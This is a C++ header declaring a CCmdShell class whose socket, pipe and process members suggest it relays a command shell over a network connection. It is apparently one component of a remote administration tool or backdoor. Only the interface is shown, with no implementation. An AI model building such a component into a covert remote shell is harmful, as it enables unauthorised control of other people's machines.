#pragma once
#include "MySocket.h"
class CCmdShell
{
public:
	CCmdShell();
	~CCmdShell();
	void Cmd_Init();
	void Cmd_Recv(char recv_buff[1024]);
	void Cmd_Send();
	DWORD GetProcID();
	void Cmd_GetSock(SOCKET sock);
	void NoTaskExit(SOCKET Socket);
private:
	SOCKET m_sock_cmd;
	CMySocket m_sock;
	HANDLE hReadPipe, hWritePipe, hWriteFile, hReadFile;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
};

